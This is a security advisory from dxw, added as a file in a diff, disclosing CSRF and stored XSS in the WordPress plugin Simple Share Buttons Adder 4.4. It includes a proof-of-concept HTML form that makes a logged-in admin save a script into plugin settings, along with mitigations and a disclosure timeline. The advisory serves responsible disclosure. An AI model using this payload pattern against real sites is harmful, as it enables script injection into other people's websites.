@@ -1,0 +1,56 @@
+Details
+================
+Software: Simple Share Buttons Adder
+Version: 4.4
+Homepage: https://wordpress.org/plugins/simple-share-buttons-adder/
+Advisory report: https://security.dxw.com/advisories/csrf-and-stored-xss-in-simple-share-buttons-adder/
+CVE: Awaiting assignment
+CVSS: 5.8 (Medium; AV:N/AC:M/Au:N/C:N/I:P/A:P)
+
+Description
+================
+CSRF and stored XSS in Simple Share Buttons Adder 4.4
+
+Vulnerability
+================
+An attacker able to convince an admin to visit a link of their choosing is able to execute arbitrary javascript in the context of the Homepage, Pages, Posts, Category/Archive pages and post Excerpts.
+
+
+Proof of concept
+================
+If a logged-in administrator user clicks the submit button on this form, a javascript alert will display on the homepage. (In a real attack the form can be made to auto-submit using Javascript).
+<form action=\"http://scone.local:8000/wp-admin/options-general.php?page=simple-share-buttons-adder\" method=\"POST\">
+    <input type=\"hidden\" name=\"ssba_options\" value=\"save\">
+    <input type=\"checkbox\" name=\"ssba_homepage\" value=\"Y\">
+    <input type=\"text\" name=\"ssba_text_placement\" value= \"below\">
+    <input type=\"text\" name=\"ssba_before_or_after\" value= \"after\">
+    <input type=\"text\" name=\"ssba_share_text\" value=\"<script>alert(\'foo\')</script>\">
+    <input type=\"submit\">
+</form>
+
+Mitigations
+================
+Immediately upgrade to version 4.5 or greater.
+
+Disclosure policy
+================
+dxw believes in responsible disclosure. Your attention is drawn to our disclosure policy: https://security.dxw.com/disclosure/
+
+Please contact us on security@dxw.com to acknowledge this report if you received it via a third party (for example, plugins@wordpress.org) as they generally cannot communicate with us on your behalf.
+
+This vulnerability will be published if we do not receive a response to this report with 14 days.
+
+Timeline
+================
+
+2014-06-19: Discovered
+2014-06-25: Reported to WP.org and author via email
+2014-06-26: Author reports issue fixed in version 4.5
+
+ 
+
+
+Discovered by dxw:
+================
+Duncan Stuart
+Please visit security.dxw.com for more information.
